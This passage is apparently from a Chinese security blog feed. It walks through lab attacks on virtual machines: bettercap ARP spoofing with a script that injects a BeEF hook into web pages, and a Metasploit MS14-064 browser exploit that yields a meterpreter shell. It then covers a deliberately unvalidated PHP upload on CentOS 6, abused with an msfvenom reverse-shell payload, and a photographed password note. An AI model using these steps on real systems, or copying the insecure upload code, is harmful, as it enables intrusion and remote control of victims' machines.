</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">Body</span><span class="o">=</span><span class="nx">body</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">               <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>将这个文件保存到你知道的目录，我将它保存到 <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code></p>
<p>然后我们回到 bettercap，设置 <code>http.proxy.script</code> 这个参数为上面这个路径：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后依次启动 <code>net.probe</code>、<code>arp.spoof</code>、<code>http.proxy</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">net.probe on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">arp.spoof on
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http.proxy on
</span></span></code></pre></td></tr></table>
</div>
</div><p>嗯&hellip; 接下来就启动好了&hellip;</p>
<p></p>
<p>然后我们让靶机打开浏览器，打开一个网页&hellip;</p>
<p>IE8 已经不支持 bing 的 https 了，所以一打开就上钩了..</p>
<p></p>
<p></p>
<p>然后我们能做的事情就很多了</p>
<p></p>
<p>我决定使用内个 clippy 的模块，绑定一个 <code>ms14-064</code> 的地址，现在轮到 msf 出场了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>启用模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">use exploit/windows/browser/ms14_064_ole_code_execution
</span></span></code></pre></td></tr></table>
</div>
</div><p>看看模块的描述</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">info 
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Description:</p>
<p>This module exploits the Windows OLE Automation array vulnerability,
CVE-2014-6332. The vulnerability is known to affect Internet
Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
and no patch for Windows XP. However, this exploit will only target
Windows XP and Windows 7 box due to the Powershell limitation.
Windows XP by defaults supports VBS, therefore it is used as the
attack vector. On other newer Windows systems, the exploit will try
using Powershell instead.</p>
</blockquote>
<p>机翻一下就是：</p>
<blockquote>
<p>该模块利用Windows OLE自动化阵列漏洞，CVE-2014-6332。已知该漏洞会影响Windows 95至Windows 10内的Internet Explorer 3.0直到11版本，Windows XP没有补丁。不过，由于Powershell的限制，这个漏洞只会针对Windows XP和Windows 7盒子。Windows XP默认支持VBS，因此它被用作攻击载体。在其他较新的Windows系统上，该漏洞将尝试使用Powershell代替。</p>
</blockquote>
<p>看看设置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">show options
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Module options (exploit/windows/browser/ms14_064_ole_code_execution):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name                   Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----                   ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
</span></span><span class="line"><span class="cl">   Retries                true             no        Allow the browser to retry the module
</span></span><span class="line"><span class="cl">   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
</span></span><span class="line"><span class="cl">   SRVPORT                8080             yes       The local port to listen on.
</span></span><span class="line"><span class="cl">   SSL                    false            no        Negotiate SSL for incoming connections
</span></span><span class="line"><span class="cl">   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
</span></span><span class="line"><span class="cl">   TRYUAC                 false            yes       Ask victim to start as Administrator
</span></span><span class="line"><span class="cl">   URIPATH                                 no        The URI to use for this exploit (default is random)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Payload options (windows/meterpreter/reverse_tcp):
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
</span></span><span class="line"><span class="cl">   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
</span></span><span class="line"><span class="cl">   LPORT     4444             yes       The listen port
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Exploit target:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   Id  Name
</span></span><span class="line"><span class="cl">   --  ----
</span></span><span class="line"><span class="cl">   0   Windows XP
</span></span></code></pre></td></tr></table>
</div>
</div><p>一般来讲我们只需要设置一个 <code>SRVHOST</code> 就可以了，但是刚刚 <code>bettercap</code> 把 <code>8080</code> 端口给占用了，因此我们需要重新设置一个 <code>SRVPORT</code>。</p>
<p><code>SRVHOST</code> 设置为攻击机的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVHOST 192.168.101.15
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>SRVPORT</code> 任意指定一个空闲的端口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVPORT 9999
</span></span></code></pre></td></tr></table>
</div>
</div><p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们得到了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Exploit running as background job 0.
</span></span><span class="line"><span class="cl">[*] Exploit completed, but no session was created.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.101.15:4444 
</span></span><span class="line"><span class="cl">[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
</span></span><span class="line"><span class="cl">[*] Server started.
</span></span></code></pre></td></tr></table>
</div>
</div><p>先把默认的 <code>Clippy image directory</code> 地址改成攻击机的地址，再把这个链接 <code>http://192.168.101.15:9999/deCFhCIwXNHYT</code> 填入 <code>Executable</code> 这一栏里面。</p>
<p></p>
<p>然后点击 <code>Execute</code></p>
<p>这时，靶机就会发生一件有趣的事情</p>
<p></p>
<p>无论点击哪个，都会跳转到 msf 的链接。</p>
<p>点击之后，msf 有了反应</p>
<p></p>
<p>一个 <code>meterpreter</code> 连接建立了</p>
<p></p>
<p>进入这个会话</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sessions -i 1
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p>这时我们就可以正常使用 <code>meterpreter</code> 操作这台靶机了..</p>
<p></p>
<p><code>getsystem</code> 提权也没有问题。</p>
<p>至于 <code>meterpreter</code> 的用法就不再继续写下去了，因为之前写过（逃。</p>
<p>然后到这里就算成功一大半了，剩下的就是后渗透，说很久都说不完呢～就到这里吧～</p>
<h2 id="结尾">结尾</h2>
<p>呼~ 写完了.. qwq</p>
<p>不过要声明一下，本文内容仅限于测试学习使用，<strong>别拿去干坏事</strong>，否则后果自负哦～</p>
<p>最后，本站遵循 <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener noreffer">CC-BY-NC 4.0 协议</a>，转载请注明出处</p>
<hr>
<h2 id="参考链接">参考链接</h2>
<ul>
<li><a href="https://cvedetails.com/cve/CVE-2014-6332/" target="_blank" rel="noopener noreffer">CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows</a></li>
<li><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064" target="_blank" rel="noopener noreffer">Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs</a></li>
<li><a href="https://www.exploit-db.com/exploits/35229" target="_blank" rel="noopener noreffer">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit</a></li>
<li><a href="https://www.exploit-db.com/exploits/35308" target="_blank" rel="noopener noreffer">Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit</a></li>
<li><a href="http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows" target="_blank" rel="noopener noreffer">IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows</a></li>
<li><a href="https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module" target="_blank" rel="noopener noreffer">CVE-2014-6332: it’s raining shells | forsec</a></li>
<li><a href="https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;gid=1&amp;pid=2" target="_blank" rel="noopener noreffer">kali bettercap的使用 | UsstZt</a></li>
<li><a href="https://blog.csdn.net/qq_33066259/article/details/80737308" target="_blank" rel="noopener noreffer">Bettercap2.6与beef的使用_请你吃橘子-CSDN博客</a></li>
<li><a href="https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead." target="_blank" rel="noopener noreffer">DeepL Translate</a></li>
</ul>
]]></description>
</item><item>
    <title>攻击 CentOS6 虚拟机</title>
    <link>http://weepingdogel.github.io/posts/2020-09-26/</link>
    <pubDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/2020-09-26/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="https://w.wallhaven.cc/full/5w/wallhaven-5we787.jpg" referrerpolicy="no-referrer">
            </div><blockquote>
<p>虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。</p>
</blockquote>
<h2 id="序">序</h2>
<p>最近总听到一些声音。</p>
<p>一些关于软件更新的、不同的声音。</p>
<p>一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写</p>
<p>另一边说：持续不断的更新才能带来更好的体验</p>
<p>我不知道哪一边是对的，但有点好奇</p>
<p>我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。</p>
<p>只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。</p>
<h2 id="模拟环境">模拟环境</h2>
<blockquote>
<p>攻击者平台: Arch Linux</p>
<p>IP: 192.168.0.109</p>
<p>受害平台: CentOS 6.1 on VirtualBox</p>
<p>IP: 192.168.0.116</p>
</blockquote>
<p><strong>假如</strong>这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）</p>
<p>我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。</p>
<p>由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。</p>
<p>外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;错误：&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;error&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;上传文件名: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件类型: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;type&#34;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件大小: &#34;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;size&#34;</span><span class="p">]</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34; kB&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件临时存储的位置: &#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;tmp_name&#34;</span><span class="p">],</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;文件存储在: &#34;</span> <span class="o">.</span> <span class="s2">&#34;upload/&#34;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">][</span><span class="s2">&#34;name&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>由于条件有限，只能模拟到这个程度，但我个人认为<del>足以进行抽象测试了</del>(逃</p>
</blockquote>
<h2 id="攻击过程">攻击过程</h2>
<p>总有人喜欢搞破坏，一名黑客对服务器进行了扫描&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -O -v 192.168.0.116
</span></span></code></pre></td></tr></table>
</div>
</div><p>结果是这样的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.116
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 998 closed ports
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">80/tcp open  http
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X|3.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.32 - 3.10
</span></span><span class="line"><span class="cl">Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=261 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Read data files from: /usr/bin/../share/nmap
</span></span><span class="line"><span class="cl">OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
</span></span><span class="line"><span class="cl">           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
</span></span></code></pre></td></tr></table>
</div>
</div><p>他惊讶地发现内核版本居然才 <code>2.6.32</code>，这样的事他还是第一次见。</p>
<p>除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。</p>
<p>他试图访问了网站，在网站上发现了一个文件上传点。</p>
<p></p>
<p>抱着试试看的态度，用 msf 生成了一个 payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.109 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o shell.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
</p>
<p>于是他启动了 <code>msfconsole</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
</span></span></code></pre></td></tr></table>
</div>
</div><p>并使用  <code>exploit/multi/handler</code> 这个模块</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 &gt; use exploit/multi/handler 
</span></span></code></pre></td></tr></table>
</div>
</div><p>依次设置好参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LHOST 192.168.0.109
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; set LPORT 4444
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set payload php/meterpreter/reverse_tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后一步就是运行模块了，</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">msf5 exploit(multi/handler) &gt; run
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后 msf 开始监听。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span></code></pre></td></tr></table>
</div>
</div><p>这时他将提示出的文件地址和链接改一下，并访问</p>
<blockquote>
<p><code>http://192.168.0.116/upload/shell.php</code></p>
</blockquote>
<p>msf 立刻就有了结果，可想而知，服务器的安全措施有多差</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.0.109:4444 
</span></span><span class="line"><span class="cl">[*] Sending stage (38288 bytes) to 192.168.0.116
</span></span><span class="line"><span class="cl">[*] Meterpreter session 1 opened (192.168.0.109:4444 -&gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>现在他开始获取系统简要信息</p>
<ul>
<li>系统、内核版本</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; sysinfo
</span></span><span class="line"><span class="cl">Computer    : localhost
</span></span><span class="line"><span class="cl">OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
</span></span><span class="line"><span class="cl">Meterpreter : php/linux
</span></span><span class="line"><span class="cl">meterpreter &gt; cat /etc/issue
</span></span><span class="line"><span class="cl">CentOS release 6.10 (Final)
</span></span><span class="line"><span class="cl">Kernel \r on an \m
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>当前控制的用户权限</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span><span class="line"><span class="cl">Server username: apache (48)
</span></span></code></pre></td></tr></table>
</div>
</div><p>权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。</p>
<p>由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。</p>
<p>看起来他需要想想其他办法。</p>
<p>他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。</p>
<p>一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。</p>
<p>上面写着一些数字和字母，也许是什么有用的东西。</p>
<p>趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。</p>
<p>比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。</p>
<p>下班后回到终端，尝试着用偷窥来的密码直接登陆 root</p>
